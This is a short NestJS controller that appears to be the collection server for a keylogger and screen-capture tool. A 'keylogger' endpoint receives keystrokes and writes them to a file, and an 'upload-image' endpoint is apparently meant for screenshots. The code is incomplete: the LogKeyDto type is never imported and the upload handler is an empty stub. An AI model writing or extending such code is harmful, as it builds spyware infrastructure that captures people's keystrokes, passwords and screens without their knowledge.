import {Body, Controller, Get, Post, UploadedFile, UseInterceptors} from '@nestjs/common';
import {ScreenService} from "./screen.service";
import {FileInterceptor} from "@nestjs/platform-express";

@Controller('screen')
export class ScreenController {
    constructor(private readonly screenService:ScreenService) {}

    @Post('upload-image')
    @UseInterceptors(FileInterceptor('image'))
    async postScreenshot() {
        return;
    }

    @Post('keylogger')
    async keyLog(@Body() logKeyDto:LogKeyDto) {
        const {key} = logKeyDto;
        this.screenService.keylogOnFile(key);
    }
}
